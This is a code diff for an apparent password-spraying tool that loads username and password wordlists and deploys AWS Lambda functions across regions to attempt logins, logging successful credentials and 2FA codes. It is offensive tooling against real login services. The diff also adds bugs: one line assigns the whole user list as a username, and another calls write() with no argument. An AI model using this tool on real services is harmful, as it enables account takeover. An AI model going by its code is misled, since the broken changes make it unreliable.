@@ -100,7 +100,7 @@ def display_stats(start=True):
 		log_entry('User/Password Combinations: {}'.format(len(credentials['accounts'])))
 		log_entry('Total Regions Available: {}'.format(len(regions)))
 		log_entry('Total Lambdas: {}'.format(lambda_count))
-		
+
 
 	if end_time and not start:
 		log_entry('End Time: {}'.format(end_time))
@@ -154,13 +154,15 @@ def load_credentials(user_file, password_file,useragent_file=None):
 	for user in users:
 		for password in passwords:
 			cred = {}
-			cred['username'] = user
+			cred['username'] = users
 			cred['password'] = password
 			cred['useragent'] = random.choice(useragents)
 			credentials['accounts'].append(cred)
 
 	for cred in credentials['accounts']:
 		q.put(cred)
+
+	log_entry('Finished loading credentials from {} and {}'.format(user_file, password_file))
 
 
 def load_file(filename):
@@ -222,11 +224,11 @@ def create_zip(plugin):
 	plugin_path = 'plugins/{}/'.format(plugin)
 	random_name = next(generate_random())
 	build_zip = 'build/{}_{}.zip'.format(plugin, random_name)
-	
+
 	with lock:
 		log_entry('Creating build deployment for plugin: {}'.format(plugin))
 		shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)
-	
+
 	return build_zip
 
 
@@ -301,7 +303,7 @@ def create_role(access_key, secret_access_key, region_name):
 	for current_role in check_roles:
 		arn = current_role['Arn']
 		role_name = current_role['RoleName']
-		
+
 		if 'CredKing_Role' == role_name:
 			return arn
 
@@ -316,7 +318,7 @@ def create_lambda(access_key, secret_access_key, zip_path, region_idx):
 	region = regions[region_idx]
 	head,tail = ntpath.split(zip_path)
 	build_file = tail.split('.')[0]
-	plugin_name = build_file.split('_')[0]
+	plugin_name = build_file.rsplit('_', 1)[0]
 
 	handler_name = '{}.lambda_handler'.format(plugin_name)
 	zip_data = None
@@ -369,18 +371,19 @@ def invoke_lambda(access_key, secret_access_key, arn, payload):
 	return_payload = json.loads(response['Payload'].read().decode("utf-8"))
 	user, password = return_payload['username'], return_payload['password']
 	code_2fa = return_payload['code']
-
-	if return_payload['success'] == True:
+	if return_payload['success'] is True:
 		clear_credentials(user, password)
-
 		log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
+		f = open('wins', 'w+')
+		f.write()
+		f.close()
 	else:
 		log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))
-		
+
 
 def log_entry(entry):
 	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-	print('[{}] {}'.format(ts, entry))
+	print('[{}] {}'.format(ts, entry), flush=True)
 
 
 def clean_up(access_key, secret_access_key, only_lambdas=True):
@@ -407,7 +410,7 @@ def clean_up(access_key, secret_access_key, only_lambdas=True):
 							client.delete_function(FunctionName=lambda_name)
 						except:
 							log_entry('Failed to clean-up {} using client region {}'.format(arn, region))
-		except:			
+		except:
 			log_entry('Failed to connect to client region {}'.format(region))
 
 	filelist = [ f for f in os.listdir('build') if f.endswith(".zip") ]
